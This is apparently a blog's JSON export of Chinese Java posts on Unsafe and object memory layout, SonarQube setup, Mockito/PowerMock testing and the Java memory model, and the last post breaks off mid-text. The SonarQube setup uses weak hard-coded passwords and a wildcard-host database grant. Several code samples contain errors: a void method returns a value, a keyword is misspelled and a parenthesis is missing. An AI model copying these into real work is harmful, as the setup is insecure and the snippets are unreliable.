这就是经典的CAS的算法，这里包含两个陌生的东西，unsafe，stateOffset。 1234private static final Unsafe unsafe = Unsafe.getUnsafe();stateOffset = unsafe.objectFieldOffset (AbstractQueuedSynchronizer.class.getDeclaredField(&quot;state&quot;)); 又发现stateOffset是跟AQS里面的state字段相关 1private volatile int state; 然后我们又发现state是volatitle类型的，当然这是实现LOCK必备的。 思考这个stateOffset是什么，值是多少，由stateOffset能得到什么？由CAS的算法我们知道需要跟原值进行对比，所以大胆推测通过stateOffset可以得到state字段的值。 另外还有一个东西很让人好奇，UNSAFE是什么，能做什么？ 粗略认识带着这两个问题，查了不少资料，这里我希望尽量能用白话的方式说明一下。 UNSAFE，顾名思义是不安全的，他的不安全是因为他的权限很大，可以调用操作系统底层直接操作内存空间，所以一般不允许使用。 可参考：java对象的内存布局(二):利用sun.misc.Unsafe获取类字段的偏移地址和读取字段的值 我们注意到上面有一个方法 stateOffset=unsafe.objectFieldOffset(field) 从方法名上可以这样理解：获取object对象的属性Field的偏移量。 要理解这个偏移量，需要先了解java的内存模型 Java内存模型 此文章值得认真阅读几遍： java对象在内存中的结构（HotSpot虚拟机） Java对象在内存中存储的布局可以分为三块区域：对象头（Header）、实例数据（Instance Data）和对齐填充（Padding），简单的理解： 对象头，对象是什么？ 实例数据，对象里有什么？ 对齐填充 ，不关键，目的是补齐位数达到8的倍数。 参考： 对象的内存布局 image.png 举个简单的例子，如下类： 1234class VO &#123; public int a = 0; public int b = 0;&#125; VO vo=new VO();的时候，Java内存中就开辟了一块地址，包含一个固定长度的对象头（假设是16字节，不同位数机器/对象头是否压缩都会影响对象头长度）+实例数据（4字节的a+4字节的b）+padding。 这里直接说结论，我们上面说的偏移量就是在这里体现，如上面a属性的偏移量就是16，b属性的偏移量就是20。 在unsafe类里面，我们发现一个方法unsafe.getInt(object, offset); 通过unsafe.getInt(vo, 16) 就可以得到vo.a的值。是不是联想到反射了？其实java的反射底层就是用的UNSAFE（*具体如何实现，预留到以后研究*）。 进一步思考如何知道一个类里面每个属性的偏移量？只根据偏移量，java怎么知道读取到哪里为止是这个属性的值？ 查看属性偏移量，推荐一个工具类jol：http://openjdk.java.net/projects/code-tools/jol/ 用jol可以很方便的查看java的内存布局情况，结合一下代码讲解 12345&lt;dependency&gt; &lt;groupId&gt;org.openjdk.jol&lt;/groupId&gt; &lt;artifactId&gt;jol-core&lt;/artifactId&gt; &lt;version&gt;0.9&lt;/version&gt;&lt;/dependency&gt; 1234567891011public class VO &#123; public int a = 0; public long b = 0; public String c= &quot;123&quot;; public Object d= null; public int e = 100; public static int f= 0; public static String g= &quot;&quot;; public Object h= null; public boolean i;&#125; 1234567891011121314151617181920212223public static void main(String[] args) throws Exception &#123; System.out.println(VM.current().details()); System.out.println(ClassLayout.parseClass(VO.class).toPrintable()); System.out.println(&quot;=================&quot;); Unsafe unsafe = getUnsafeInstance(); VO vo = new VO(); vo.a=2; vo.b=3; vo.d=new HashMap&lt;&gt;(); long aoffset = unsafe.objectFieldOffset(VO.class.getDeclaredField(&quot;a&quot;)); System.out.println(&quot;aoffset=&quot;+aoffset); // 获取a的值 int va = unsafe.getInt(vo, aoffset); System.out.println(&quot;va=&quot;+va);&#125;public static Unsafe getUnsafeInstance() throws Exception &#123; // 通过反射获取rt.jar下的Unsafe类 Field theUnsafeInstance = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;); theUnsafeInstance.setAccessible(true); // return (Unsafe) theUnsafeInstance.get(null);是等价的 return (Unsafe) theUnsafeInstance.get(Unsafe.class);&#125; 在我本地机器测试结果如下： 12345678910111213141516171819202122232425# Running 64-bit HotSpot VM.# Using compressed oop with 0-bit shift.# Using compressed klass with 3-bit shift.# Objects are 8 bytes aligned.# Field sizes by type: 4, 1, 1, 2, 2, 4, 4, 8, 8 [bytes]# Array element sizes: 4, 1, 1, 2, 2, 4, 4, 8, 8 [bytes]com.ha.net.nsp.product.VO object internals: OFFSET SIZE TYPE DESCRIPTION VALUE 0 12 (object header) N/A 12 4 int VO.a N/A 16 8 long VO.b N/A 24 4 int VO.e N/A 28 1 boolean VO.i N/A 29 3 (alignment/padding gap) 32 4 java.lang.String VO.c N/A 36 4 java.lang.Object VO.d N/A 40 4 java.lang.Object VO.h N/A 44 4 (loss due to the next object alignment)Instance size: 48 bytesSpace losses: 3 bytes internal + 4 bytes external = 7 bytes total=================aoffset=12va=2 在结果中，我们发现： 1、我本地的虚拟机环境是64位并且开启了compressed压缩，对象都是8字节对齐 2、VO类的内存布局包含12字节的对象头，4字节的int数据，8字节的long数据，其他String和Object是4字节，最后还有4字节的对齐。 3、VO类属性的内存布局跟属性声明的顺序不一致。 4、VO类的static属性不在VO的内存布局中，因为他是属于class类。 5、通过VO类就可以确定一个对象占用的字节数，这个占用空间在编译阶段就已经确定（注：此占用空间并不是对象的真实占用空间，）。 6、如上，通过偏移量12就可以读取到此处存放的值是2。 引申出新的问题： 1、这里的对象头为什么是12字节？对象头里都具体包含什么？ 答：正常情况下，对象头在32位系统内占用一个机器码也就是8个字节，64位系统也是占用一个机器码16个字节。但是在我本地环境是开启了reference（指针）压缩，所以只有12个字节。 2、这里的String和Object为什么都是4字节？ 答：因为String或者Object类型，在内存布局中，都是reference类型，所以他的大小跟是否启动压缩有关。未启动压缩的时候，32位机器的reference类型是4个字节，64位是8个字节，但是如果启动压缩后，64位机器的reference类型就变成4字节。 3、Java怎么知道应该从偏移量12读取到偏移量16呢，而不是读取到偏移量18或者20？ 答：这里我猜测，虚拟机在编译阶段，就已经保留了一个VO类的偏移量数组，那12后的偏移量就是16，所以Java知道读到16为止。 更多内存布局问题请参考： java对象的内存布局(一)：计算java对象占用的内存空间以及java object layout工具的使用 Java对象内存结构 JVM内存堆布局图解分析 对象头包含什么内容java中的对象头的解析 1、对象头有几位是锁标志位 可以参考如下文章，对象头跟锁有很重要的关联，并且文章中提到另外一个概念：Monitor，预留到以后研究 死磕Java并发：深入分析synchronized的实现原理 2、对象头有几位代表分代年龄，与回收算法有关 CMS标记-清除回收算法，标记阶段的大概过程是从栈中查找所有的reference类型，递归可达的所有堆内对象的对象头都标记为数据可达，清除阶段是对堆内存从头到尾进行线性遍历，如果发现有对象没有被标识为可到达对象，那么就将此对象占用的内存回收，并且将原来标记为可到达对象的标识清除。 在 gc回收的时候，会更新还存活的对象的对象头的分代年龄，同时如果这些对象还有发生位置移动（碎片清理），那么还要重新计算对象头的hash值，以及栈中相应的reference引用的值。 说到回收算法，再参考下这篇也更能理解对象的创建和回收： 垃圾回收机制中，引用计数法是如何维护所有对象引用的？ UNSAFE与线程的关系unsafe中有一个park方法，与线程挂起有关，预留到以后研究 参考资料一个Java对象到底占多大内存？ JVM内存模型及String对象内存分配","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[],"author":{"name":"staconfree","avatar":"https://cdn2.jianshu.io/assets/default_avatar/15-a7ac401939dd4df837e3bbf82abaa2a8.jpg","url":"https://www.jianshu.com/p/cb5e09facfee"}},{"title":"sonarQube","slug":"sonarqubSonar","date":"2019-11-13T16:00:00.000Z","updated":"2020-10-25T08:27:32.000Z","comments":true,"path":"sonarqubSonar/","link":"","permalink":"https://gschaos.club/sonarqubSonar/","excerpt":"SonarQube 是一款用于代码质量管理的开源工具，它主要用于管理源代码的质量。 通过插件形式，可以支持众多计算机语言，比如 java, C#, go，C/C++, PL/SQL, Cobol, JavaScrip, Groovy 等。sonar可以通过PMD,CheckStyle,Findbugs等等代码规则检测工具来检测你的代码，帮助你发现代码的漏洞，Bug，异味等信息。以下转自自己的CSDN博客：（关于截图背景颜色请无https://blog.csdn.net/qq_17238449/article/details/97392513","text":"SonarQube 是一款用于代码质量管理的开源工具，它主要用于管理源代码的质量。 通过插件形式，可以支持众多计算机语言，比如 java, C#, go，C/C++, PL/SQL, Cobol, JavaScrip, Groovy 等。sonar可以通过PMD,CheckStyle,Findbugs等等代码规则检测工具来检测你的代码，帮助你发现代码的漏洞，Bug，异味等信息。以下转自自己的CSDN博客：（关于截图背景颜色请无https://blog.csdn.net/qq_17238449/article/details/97392513 Sonarqube搭建1、安装这里准备的是**sonarqube7.7.zip**，我的安装路径是/u02/ycc 使用unzip解压压缩包； 预置条件 1).已安装JAVA环境 2).已安装有MySQL数据库 3).sonarQube压缩包 2、数据库配置：1234567891011121314151617# 创建数据库sonarcreate database sonar character set utf8 collate utf8_general_ci;# 创建数据库用户sonar可用地址为192.168.6.226密码sonarCREATE USER sonar@&#x27;192.168.6.226&#x27; identified by &#x27;sonar&#x27;;# 赋权给用户sonar对数据库sonar有所有权限grant all on sonar.* to &#x27;sonar&#x27;@&#x27;%&#x27; identified by &#x27;sonar&#x27;;# 授权sonar用户可以在本地连接数据库grant all on sonar.* to &#x27;sonar&#x27;@&#x27;localhost&#x27; identified by &#x27;sonar&#x27;;# 授权sonar用户可以在226连接数据库grant all on sonar.* to &#x27;sonar&#x27;@&#x27;192.168.6.226&#x27; identified by &#x27;sonar&#x27;;# 刷新权限flush privileges; 对权限的所有操作最后需要刷新下权限，即flush privileges;使之更改立马生效。 3、修改sonar配置文件：sonar.properties我的数据库在17，使用时更改这个地址到自己的数据库地址即可。 123sonar.jdbc.username&#x3D;sonarsonar.jdbc.password&#x3D;sonarsonar.jdbc.url&#x3D;jdbc:mysql:&#x2F;&#x2F;192.168.6.17:3306&#x2F;sonar?useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf8&amp;rewriteBatchedStatements&#x3D;true&amp;useConfigs&#x3D;maxPerformance&amp;useSSL 修改wrapper配置文件的java路径 wrapper配置文件额sonar.properties在同一个目录里，这里需要注意一点，路径后面需要额外加上/java。不加会报 Unable to start JVM: Permission denied (13)的错误。 1wrapper.java.command=/u02/ycc/jdk1.8.0_161/bin/java 启动 1sh &#x2F;u02&#x2F;ycc&#x2F;sonar...&#x2F;bin&#x2F;linux...&#x2F;sonar.sh start 如果使用root的话会出现如下错误： 换个用户，并赋予这个用户sonar目录的权限即可。 4、启动sonarqube 将中文插件sonar-l10n-zh-plugin-1.28.jar复制到extensions/plugins 5、安装SonarQube Scanner和配置1234567//解压文件//进入文件//编辑文件[root@localhost local]#unzip sonar-scanner-cli-3.0.3.778-linux.zip[root@localhost local]#mv sonar-scanner-cli-3.0.3.778-linux sonar-scanner[root@localhost local]# cd sonar-scanner[root@localhost sonar-scanner]# vim conf/sonar-scanner.properties 1234567891011#Configure here general information about the environment, such as SonarQube DB details for example#No information about specific project should appear here#----- Default source code encodingsonar.sourceEncoding&#x3D;UTF-8 sonar.host.url&#x3D;http:&#x2F;&#x2F;192.168.6.226:9000sonar.jdbc.username&#x3D;sonarsonar.jdbc.password&#x3D;sonarsonar.jdbc.url&#x3D;jdbc:mysql:&#x2F;&#x2F;192.168.6.17:3306&#x2F;sonar?useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf8sonar.login&#x3D;sonarsonar.password&#x3D;sonar 在项目的根目录创建sonar-project.properties 1234567891011121314151617#sonar登陆用户sonar.login&#x3D;admin#sonar登陆密码sonar.password&#x3D;admin#需要扫描的项目对应的key自定义即可sonar.projectKey&#x3D;content-receive#需要扫描的项目对应的显示项目名自定义即可sonar.projectName&#x3D;content-receivesonar.projectVersion&#x3D;1.0-SNAPSHOTsonar.sourceEncoding&#x3D;UTF-8sonar.language&#x3D;java#扫描的源码位置sonar.sources&#x3D;src&#x2F;main&#x2F;java&#x2F;com&#x2F;jsc&#x2F;content#扫描的test位置sonar.tests&#x3D;src&#x2F;test&#x2F;java&#x2F;com&#x2F;jsc&#x2F;content#扫描java的源码位置sonar.java.binaries&#x3D;target&#x2F;classes&#x2F;com&#x2F;jsc&#x2F;content 在项目当前目录执行scanner ： 1sh &#x2F;sonarscannerdir&#x2F;bin&#x2F;sonar-scanner -X 运行结束在sonarQube页面即可看到刚才扫描的项目。 6、maven-sonar-plugin对于Maven项目，除了使用SonarQube Scanner进行分析之外，还可以使用maven-sonar-plugin插件进行分析。使用maven-sonar-plugin插件的步骤如下：(setting.xml) 123456789101112131415161718&lt;profile&gt; &lt;id&gt;sonar&lt;/id&gt; &lt;activation&gt; &lt;activeByDefault&gt;true&lt;/activeByDefault&gt; &lt;/activation&gt; &lt;properties&gt; &lt;sonar.jdbc.url&gt;jdbc:mysql://192.168.6.226:3306/sonar&lt;/sonar.jdbc.url&gt; &lt;sonar.jdbc.username&gt;sonar&lt;/sonar.jdbc.username&gt; &lt;sonar.jdbc.password&gt;sonar&lt;/sonar.jdbc.password&gt; &lt;sonar.host.url&gt;http://192.168.6.226:9000&lt;/sonar.host.url&gt; &lt;/properties&gt; &lt;/profile&gt; &lt;/profiles&gt; &lt;activeProfiles&gt; &lt;activeProfile&gt;UFindNexus&lt;/activeProfile&gt; &lt;activeProfile&gt;sonar&lt;/activeProfile&gt; &lt;/activeProfiles&gt; pom.xml的build中增加如下配置： 123456789&lt;pluginManagement&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.sonarsource.scanner.maven&lt;/groupId&gt; &lt;artifactId&gt;sonar-maven-plugin&lt;/artifactId&gt; &lt;version&gt;3.1.1&lt;/version&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/pluginManagement&gt; 在对应项目的控制台输入mvn clean verify sonar:sonar或mvn clean install org.sonarsource.scanner.maven:sonar-maven-plugin:3.1.1:sonar执行扫描；这里注意，如果有多个maven的setting.xml会使用环境变量配置的setting.xml。执行完即可在sonarqube页面查看。 如果这里执行报错的话可以使用IDEA的run maven运行： 也可以在pom.xml中增加profile,此时选中sonar-project,执行 clean install sonar:sonar即可。 12345678910111213141516&lt;profiles&gt; &lt;profile&gt; &lt;id&gt;sonar-project&lt;/id&gt; &lt;activation&gt; &lt;activeByDefault&gt;true&lt;/activeByDefault&gt; &lt;/activation&gt; &lt;properties&gt; &lt;sonar.jdbc.url&gt;jdbc:mysql://192.168.6.213:3306/sonar&lt;/sonar.jdbc.url&gt; &lt;sonar.jdbc.username&gt;root&lt;/sonar.jdbc.username&gt; &lt;sonar.jdbc.password&gt;passok&lt;/sonar.jdbc.password&gt; &lt;sonar.host.url&gt;http://192.168.6.213:9000&lt;/sonar.host.url&gt; &lt;!-- 需要忽略的--&gt; &lt;sonar.exclusions&gt;src/main/java/com/jsc/codec/**&lt;/sonar.exclusions&gt; &lt;/properties&gt; &lt;/profile&gt;&lt;/profiles&gt; Sonarqube使用SonarQube 是一个开源的代码分析平台, 用来持续分析和评测项目源代码的质量。 通过SonarQube我们可以检测出项目中重复代码， 潜在bug， 代码规范，安全性漏洞等问题， 并通过SonarQube web UI展示出来。 1.SonarQube扫描方法Jenkins中调用通过jenkins插件调用sonarScanner或使用Maven、Gradle等内置扫描器依据项目需要，对代码持续扫描，并将结果推送到sonarqube 进行页面展示 SonarQube Scanner使用scanner，通过配置文件，修改项目信息，在命令行中调用scanner工具，进行扫描，并推送给sonarqube Maven、Gradle等内置扫描器 以maven为例，需要修改maven和sonarqube配置文件，在mvn编译后，使用mvn命令，进行代码扫描，并推送给sonarqube（需要编译源代码） ,参见上文。 2.SonarQube web UI显示用户所有的项目概况，各项目质量评级，并提供条件筛选 3.SonarQube web UI –项目页面通过在主页面选择单个项目，进入项目详情，该页面提供了当前项目最近一次扫描的结果评级，历史累计和新增问题数量，代码行数等信息 。 4.SonarQube web UI –问题页面提供当前用户名下所有问题的列表，并提供条件筛选，包括问题类型，严重程度等在当个项目中，问题页面显示单项目信息 。 选中单个问题，查看问题代码详情，sonarqube给出问题描述和修改意见 。 5.SonarQube web UI –评估页面给出当前项目的评估概况信息，大小，可靠性，重复率，覆盖率等 。 6.SonarQube web UI –代码页面以.java文件为依据，给出各个.java文件统计信息 。 7.SonarQube web UI –活动页面页面展示了每次代码扫描的基本信息和代码情况的折线图，折线图可以根据需要调整显示bugs数量，代码行数，覆盖率等信息 。 SonarQube Jekins集成1、安装jenkins sonar插件。略 2、配置sonarServer进入系统管理–&gt;系统配置界面。(这里选择测试环境的sonarQube地址) 进入系统管理–&gt;全局工具配置 3、构建项目回到主页找到需要配置的项目，如果没有则需要新建项目，这里不赘述如何创建。选中项目配置sonar(这里使用 sonar-scanner)。 在构建历史中可以看到运行中的构建，点进去查看信息： 另外一种方式是使用maven命令打包，此时需要配置setting.xml，配置见前文。 4、查看结果","categories":[{"name":"工具","slug":"工具","permalink":"https://gschaos.club/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"sonarQube","slug":"sonarQube","permalink":"https://gschaos.club/tags/sonarQube/"}]},{"title":"Mockito和PowerMock用法","slug":"powermock","date":"2019-11-11T16:00:00.000Z","updated":"2020-10-25T08:26:26.000Z","comments":true,"path":"powermock/","link":"","permalink":"https://gschaos.club/powermock/","excerpt":"在单元测试中，我们往往想去独立地去测一个类中的某个方法，但是这个类可不是独立的，它会去调用一些其它类的方法和service，这也就导致了以下两个问题：外部服务可能无法在单元测试的环境中正常工作，因为它们可能需要访问数据库或者使用一些其它的外部系统。我们的测试关注点在于这个类的实现上，外部类的一些行为可能会影响到我们对本类的测试，那也就失去了我们进行单测的意义。","text":"在单元测试中，我们往往想去独立地去测一个类中的某个方法，但是这个类可不是独立的，它会去调用一些其它类的方法和service，这也就导致了以下两个问题：外部服务可能无法在单元测试的环境中正常工作，因为它们可能需要访问数据库或者使用一些其它的外部系统。我们的测试关注点在于这个类的实现上，外部类的一些行为可能会影响到我们对本类的测试，那也就失去了我们进行单测的意义。 一、mock测试和Mock对象mock对象就是在调试期间用来作为真实对象的替代品mock测试就是在测试过程中，对那些不容易构建的对象用一个虚拟对象来代替测试的方法就叫mock测试 二、Mockito和PowerMock PowerMock是Java开发中的一种Mock框架，用于单元模块测试。当你想要测试一个service接口，但service需要经过防火墙访问，防火墙不能为你打开或者你需要认证才能访问。遇到这样情况时，你可以在你能访问的地方使用MockService替代，模拟实现获取数据。 PowerMock可以实现完成对private/static/final方法的Mock（模拟），而Mockito可以对普通的方法进行Mock，如：public等。 三、Mockito的使用12345// 1、模拟HttpServletRequest对象，不需要依赖web容器，模拟获得请求参数HttpServletRequest request = mock(HttpServletRequest.class); when(request.getParameter(&quot;foo&quot;)).thenReturn(&quot;boo&quot;);// 注意:mock()是Mockito的静态方法，可以用@mock注解替换private @mock HttpServletRequest request 123456// 2、Person person =mock(Person.class);// 第一次调用返回&quot;xiaoming&quot;，第二次调用返回&quot;xiaohong&quot;when(person.getName()).thenReturn(&quot;xiaoming&quot;).thenReturn(&quot;xiaohong&quot;); when(person.getName()).thenReturn(&quot;xiaoming&quot;, &quot;xiaohong&quot;); when(person.getName()).thenReturn(&quot;xiaoming&quot;); when(person.getName()).thenReturn(&quot;xiaohong&quot;); 123// 3、mockito模拟测试无返回值的方法Person person =mock(Person.class);doNothing().when(person).remove(); 1234// 4、mockito还能对被测试的方法强行抛出异常Person person =mock(Person.class);doThrow(new RuntimeException()).when(person).remove();when(person.next()).thenThrow(new RuntimeException()); 12345678910111213141516// 5、//UserAppService用于参数匹配器的demo参数匹配器 UserApp app = new UserApp(); app.setAppKey(&quot;q1w2e3r4t5y6u7i8o9p0&quot;); app.setAppSecret(&quot;q1w2e3r4t5y6u7i8o9p0&quot;); when(userAppMapper.getAppSecretByAppKey(argThat(new ArgumentMatcher&lt;String&gt;() &#123; @Override public boolean matches(Object argument) &#123; String arg = (String) argument; if (arg.equals(&quot;1234567890&quot;) || arg.equals(&quot;q1w2e3r4t5y6u7i8o9p0&quot;)) &#123; return true; &#125; else &#123; throw new RuntimeException(); &#125; &#125; &#125;))).thenReturn(app); 1234567891011121314151617// 6、Answer接口模拟根据参数返回不同结果 when(userAppMapper.getAppSecretByAppKey(anyString())).thenAnswer( (InvocationOnMock invocationOnMock) -&gt; &#123; String arg = (String) invocationOnMock.getArguments()[0]; if (null == arg || arg.equals(null)) &#123; return null; &#125; else if (arg.equals(&quot;q1w2e3r4t5y6u7i8o9p0&quot;)) &#123; UserApp app = new UserApp(); app.setAppKey(&quot;q1w2e3r4t5y6u7i8o9p0&quot;); app.setAppSecret(&quot;q1w2e3r4t5y6u7i8o9p0&quot;); return app; &#125; else &#123; return null; &#125; &#125;); 12345678910111213// 7、Mock对象是能调用模拟方法，调用不了它真实的方法，但是spy() 或者@spy 可以监视一个真实的对象，对它进行方法调用时它将调用真实的方法，同时也可以设定这个对象的方法让它返回我们的期望值。同时，我们也可以用verify进行验证。class A &#123; public void goHome() &#123; System.out.println(&quot;I say go go go!!&quot;); return true; &#125; &#125; // 当需要整体Mock，只有少部分方法执行真正部分时，选用这种方式 A mockA = Mockito.mock(A.class); Mockito.doCallRealMethod().when(mockA).goHome(); // 当需要整体执行真正部分，只有少部分方法执行mock，选用这种方式 A spyA = Mockito.spy(new A()); Mockito.when(spyA.goHome()).thenReturn(false); Demo演示 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//目标测试类@Servicepublic class UserAppService &#123; @Autowired private UserAppMapper userAppMapper; /** * 通过appKey查询AppSecre * @return */ public String getAppSecretByAppKey(String appKey)&#123; if (StringUtils.isEmpty(appKey)) &#123; return null; &#125; UserApp userApp = userAppMapper.getAppSecretByAppKey(appKey); if (null == userApp) &#123; return null; &#125; return userApp.getAppSecret(); &#125;&#125;@RunWith(SpringJUnit4ClassRunner.class)public class UserAppServiceTest &#123; @InjectMocks //创建一个实例，其余用@Mock（或@Spy）注解创建的mock将被注入到用该实例中 private UserAppService userAppService; @Mock private UserAppMapper userAppMapper; @Before public void setUp() &#123; MockitoAnnotations.initMocks(this); &#125;//初始化Mock对象 @Test public void getAppSecretByAppKey3() throws Exception &#123; when(userAppMapper.getAppSecretByAppKey(anyString())).thenAnswer( (InvocationOnMock invocationOnMock) -&gt; &#123; String arg = (String) invocationOnMock.getArguments()[0]; if (null == arg || arg.equals(null)) &#123; return null; &#125; else if (arg.equals(&quot;q1w2e3r4t5y6u7i8o9p0&quot;)) &#123; UserApp app = new UserApp(); app.setAppKey(&quot;q1w2e3r4t5y6u7i8o9p0&quot;); app.setAppSecret(&quot;q1w2e3r4t5y6u7i8o9p0&quot;); return app; &#125; else &#123; return null; &#125; &#125;); assertEquals(userAppService.getAppSecretByAppKey(&quot;q1w2e3r4t5y6u7i8o9p0&quot;), &quot;q1w2e3r4t5y6u7i8o9p0&quot;); assertEquals(userAppService.getAppSecretByAppKey(&quot;123456789&quot;), null); assertEquals(userAppService.getAppSecretByAppKey(null), null); verify(userAppMapper, only()).getAppSecretByAppKey(anyString()); &#125;// 注意：verify记录着这个模拟对象调用了什么方法，调用了多少次，never() 没有被调用，相当于 times(0)，atLeast(N) 至少被调用 N 次，atLeastOnce() 相当于 atLeast(1)，atMost(N) 最多被调用 N 次// 参数匹配也可以为：verify(mock).someMethod(anyInt(), anyString()); 四、PowerMock的使用PowerMock基于Mockito开发，起语法规则与Mockito一致，主要区别在于使用方面，以实现完成对private/static/final等方法(也支持mock的对象是在方法内部new出来的)的Mock（模拟）。具体事例如下： 依赖 123456789101112131415161718&lt;dependency&gt; &lt;groupId&gt;org.powermock&lt;/groupId&gt; &lt;artifactId&gt;powermock-module-junit4&lt;/artifactId&gt; &lt;version&gt;$&#123;powermock.version&#125;&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;objenesis&lt;/artifactId&gt; &lt;groupId&gt;org.objenesis&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.powermock&lt;/groupId&gt; &lt;artifactId&gt;powermock-api-mockito&lt;/artifactId&gt; &lt;version&gt;$&#123;powermock.version&#125;&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt; 12345//2、 PowerMock有两个重要的注解： –@RunWith(PowerMockRunner.class) –@PrepareForTest( &#123; YourClassWithEgStaticMethod.class &#125;) // 如果你的测试用例里没有使用注解@PrepareForTest，那么可以不用加注解@RunWith(PowerMockRunner.class)，反之亦然。当你需要使用PowerMock强大功能（Mock静态、final、私有方法等）的时候，就需要加注解@PrepareForTest。 123456789101112131415161718192021222324252627//测试类public class ClassUnderTest &#123; public boolean callArgumentInstance(File file) &#123; return file.exists(); &#125; public boolean callFinalMethod(ClassDependency refer) &#123; return refer.isAlive(); &#125; public boolean callStaticMethod() &#123; return ClassDependency.isExist(); &#125; public boolean callPrivateMethod() &#123; return ClassDependency.delete(); &#125; &#125; //依赖类public class ClassDependency &#123; public static boolean isExist() &#123; return false; &#125; public final boolean isAlive() &#123; return false; &#125; priavte final boolean delete() &#123; return false; &#125; &#125; 123456789// 2、Mock方法内部new出来的对象public void testCallInternalInstance() throws Exception &#123; File file = PowerMockito.mock(File.class); ClassUnderTest underTest = new ClassUnderTest(); PowerMockito.whenNew(File.class).withArguments(&quot;bbb&quot;).thenReturn(file); PowerMockito.when(underTest.callArgumentInstance( new File(&quot;bbb&quot;))).thenReturn(true); PowerMockito.when(file.exists()).thenReturn(true); Assert.assertTrue(file.exists(); &#125; 1234567// 3、Mock普通对象的final方法public void testCallFinalMethod() &#123; ClassDependency depencency = PowerMockito.mock(ClassDependency.class); ClassUnderTest underTest = new ClassUnderTest(); PowerMockito.when(depencency.isAlive()).thenReturn(true); Assert.assertTrue(underTest.callFinalMethod(depencency)); &#125; 1234567// 4、Mock静态方法public void testCallStaticMethod() &#123; ClassUnderTest underTest = new ClassUnderTest(); PowerMockito.mockStatic(ClassDependency.class); PowerMockito.when(ClassDependency.isExist()).thenReturn(true); Assert.assertTrue(underTest.callStaticMethod()); &#125; 123456// 5、Mock私有方法public void testCallPrivateMethod() throws Exception &#123; ClassUnderTest underTest = PowerMockito.mock(ClassUnderTest.class); PowerMockito.when(underTest,&quot;callPrivateMethod&quot;).thenCallRealMethod(); Assert.assertTrue(underTest.callPrivateMethod()); &#125;","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"},{"name":"单元测试","slug":"单元测试","permalink":"https://gschaos.club/tags/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"}]},{"title":"Java 内存模型","slug":"java memory model","date":"2019-11-10T16:00:00.000Z","updated":"2020-10-25T08:24:10.000Z","comments":true,"path":"java memory model/","link":"","permalink":"https://gschaos.club/java%20memory%20model/","excerpt":"在并发编程中，我们需要处理两个关键问题：线程之间如何通信及线程之间如何同步（这里的线程是指并发执行的活动实体）。通信是指线程之间以何种机制来交换信息。在命令式编程中，线程之间的通信机制有两种：共享内存和消息传递。","text":"在并发编程中，我们需要处理两个关键问题：线程之间如何通信及线程之间如何同步（这里的线程是指并发执行的活动实体）。通信是指线程之间以何种机制来交换信息。在命令式编程中，线程之间的通信机制有两种：共享内存和消息传递。 作者：程晓明 出处:https://www.infoq.cn/article/java-memory-model-1 并发编程模型的分类在并发编程中，我们需要处理两个关键问题：线程之间如何通信及线程之间如何同步（这里的线程是指并发执行的活动实体）。通信是指线程之间以何种机制来交换信息。在命令式编程中，线程之间的通信机制有两种：共享内存和消息传递。 在共享内存的并发模型里，线程之间共享程序的公共状态，线程之间通过写 - 读内存中的公共状态来隐式进行通信。在消息传递的并发模型里，线程之间没有公共状态，线程之间必须通过明确的发送消息来显式进行通信。 同步是指程序用于控制不同线程之间操作发生相对顺序的机制。在共享内存并发模型里，同步是显式进行的。程序员必须显式指定某个方法或某段代码需要在线程之间互斥执行。在消息传递的并发模型里，由于消息的发送必须在消息的接收之前，因此同步是隐式进行的。 Java 的并发采用的是共享内存模型，Java 线程之间的通信总是隐式进行，整个通信过程对程序员完全透明。如果编写多线程程序的 Java 程序员不理解隐式进行的线程之间通信的工作机制，很可能会遇到各种奇怪的内存可见性问题。 Java 内存模型的抽象在 java 中，所有实例域、静态域和数组元素存储在堆内存中，堆内存在线程之间共享（本文使用“共享变量”这个术语代指实例域，静态域和数组元素）。局部变量（Local variables），方法定义参数（java 语言规范称之为 formal method parameters）和异常处理器参数（exception handler parameters）不会在线程之间共享，它们不会有内存可见性问题，也不受内存模型的影响。 Java 线程之间的通信由 Java 内存模型（本文简称为 JMM）控制，JMM 决定一个线程对共享变量的写入何时对另一个线程可见。从抽象的角度来看，JMM 定义了线程和主内存之间的抽象关系：线程之间的共享变量存储在主内存（main memory）中，每个线程都有一个私有的本地内存（local memory），本地内存中存储了该线程以读 / 写共享变量的副本。本地内存是 JMM 的一个抽象概念，并不真实存在。它涵盖了缓存，写缓冲区，寄存器以及其他的硬件和编译器优化。Java 内存模型的抽象示意图如下： 从上图来看，线程 A 与线程 B 之间如要通信的话，必须要经历下面 2 个步骤： 首先，线程 A 把本地内存 A 中更新过的共享变量刷新到主内存中去。 然后，线程 B 到主内存中去读取线程 A 之前已更新过的共享变量。 下面通过示意图来说明这两个步骤： 如上图所示，本地内存 A 和 B 有主内存中共享变量 x 的副本。假设初始时，这三个内存中的 x 值都为 0。线程 A 在执行时，把更新后的 x 值（假设值为 1）临时存放在自己的本地内存 A 中。当线程 A 和线程 B 需要通信时，线程 A 首先会把自己本地内存中修改后的 x 值刷新到主内存中，此时主内存中的 x 值变为了 1。随后，线程 B 到主内存中去读取线程 A 更新后的 x 值，此时线程 B 的本地内存的 x 值也变为了 1。 从整体来看，这两个步骤实质上是线程 A 在向线程 B 发送消息，而且这个通信过程必须要经过主内存。JMM 通过控制主内存与每个线程的本地内存之间的交互，来为 java 程序员提供内存可见性保证。 重排序在执行程序时为了提高性能，编译器和处理器常常会对指令做重排序。重排序分三种类型： 编译器优化的重排序。编译器在不改变单线程程序语义的前提下，可以重新安排语句的执行顺序。 指令级并行的重排序。现代处理器采用了指令级并行技术（Instruction-Level Parallelism， 